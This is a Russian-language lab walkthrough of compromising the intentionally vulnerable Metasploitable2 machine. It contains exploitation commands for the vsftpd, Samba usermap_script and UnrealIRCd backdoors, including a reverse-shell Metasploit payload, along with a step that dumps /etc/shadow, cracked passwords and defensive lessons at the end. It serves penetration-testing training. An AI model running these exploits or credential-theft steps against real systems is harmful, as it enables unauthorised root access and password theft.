# Metasploitable2 — Full Compromise Walkthrough

Учебная уязвимая машина от Rapid7, специально созданная для практики пентестинга. Цель — пройти полный цикл: разведка → идентификация уязвимостей → эксплуатация → post-exploitation.

**Атакующая машина:** Kali Linux 2026.2 (`192.168.56.101`)
**Цель:** Metasploitable2 (`192.168.56.102`)
**Сеть:** VirtualBox Host-only Adapter (изолированная лабораторная сеть)

---

## 1. Recon — разведка

Полное сканирование сервисов и версий:

```bash
nmap -sV -sC 192.168.56.102
```

**Результат — ключевые находки:**

| Порт | Сервис | Версия | Заметка |
|---|---|---|---|
| 21 | FTP | vsftpd 2.3.4 | Известный backdoor (2011) + anonymous login разрешён |
| 22 | SSH | OpenSSH 4.7p1 | Устаревшая версия |
| 23 | Telnet | Linux telnetd | Передаёт credentials открытым текстом |
| 139/445 | Samba | smbd 3.0.20-Debian | Уязвим к usermap_script RCE |
| 1524 | bindshell | Metasploitable root shell | Оставлен разработчиками специально |
| 3306 | MySQL | 5.0.51a | Открыт наружу — архитектурная ошибка |
| 6667 | IRC | UnrealIRCd | Известный backdoor (CVE-2010-2075) |

Полный вывод: [`nmap-scan.txt`](./nmap-scan.txt)

**Вывод разведки:** сразу видно минимум три независимых пути получения root-доступа без брутфорса — все три упомянутых backdoor'а эксплуатируются известными, публично задокументированными методами.

## 2. Exploitation — vsftpd 2.3.4 Backdoor (CVE-2011-2523)

### Уязвимость
В архив исходников vsftpd 2.3.4 был внедрён бэкдор: если в поле username FTP-логина передать строку, заканчивающуюся на `:)`, сервис открывает root shell на порту 6200.

### Эксплуатация (ручной способ)
```bash
telnet 192.168.56.102 21
USER hack:)
PASS anything
```
Соединение обрывается — бэкдор сработал в фоне. Подключение к открывшемуся shell:
```bash
nc 192.168.56.102 6200
whoami
# root
```

### Через Metasploit (альтернативный путь)
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
run
```

**Результат:** Root shell без единого пароля.

## 3. Exploitation — Samba usermap_script (CVE-2007-2447)

### Уязвимость
Конфигурация `username map script` в Samba позволяет внедрить произвольную команду ОС через специально сформированное имя пользователя при аутентификации.

### Эксплуатация
```
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
set payload cmd/unix/reverse
run
```

**Результат:** Root shell через reverse-соединение.

---

## 4. Exploitation — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)

### Уязвимость
Между ноябрём 2009 и июнём 2010 архив с исходниками UnrealIRCd на официальном сервере был скомпрометирован — в код был внедрён бэкдор, позволяющий выполнение произвольных команд через специальную последовательность в IRC-протоколе.

### Эксплуатация
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
run
```

**Результат:** полноценная Meterpreter-сессия (не просто командный shell — расширенный набор возможностей: файловая система, сеть, процессы).

Проверка доступа:
```
meterpreter > getuid
Server username: root
meterpreter > sysinfo
```

## 5. Post-Exploitation — Password Cracking

Получив root-доступ, извлёк файл с хешами паролей:
```bash
cat /etc/shadow
```

Скопировал хеши локально на Kali и запустил словарную атаку:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Результат — взломано 3 из 7 хешей за ~5 минут:**

| Пользователь | Пароль | Комментарий |
|---|---|---|
| `klog` | `123456789` | Классический слабый пароль |
| `service` | `service` | Логин = пароль |
| `sys` | `batman` | Популярное слово, есть в топ-словарях |

Проверка через SSH подтвердила рабочесть найденных паролей.

## Lessons Learned / Defensive Takeaways

Что можно было бы сделать иначе, если бы это была защищаемая система (взгляд со стороны Blue Team):

- **vsftpd/UnrealIRCd backdoor** — проверка контрольных сумм (checksums/GPG-подписей) скачиваемого ПО перед установкой предотвратила бы обе компрометации архива на уровне supply chain
- **Устаревшие версии сервисов** — регулярный vulnerability scanning (например через OpenVAS/Nessus) выявил бы все три известные CVE до того, как это сделал бы атакующий
- **Слабые пароли** — политика сложности паролей + периодический аудит через тот же John the Ripper со стороны защитников (proactive password auditing) закрыли бы этот вектор
- **MySQL открыт наружу** — базовая сетевая сегментация (firewall правила, ограничение доступа к БД только с локального хоста) убрала бы этот порт из зоны атаки вообще
- **Telnet вместо SSH** — устаревший протокол без шифрования не должен использоваться в принципе; обнаруживается элементарным аудитом открытых портов
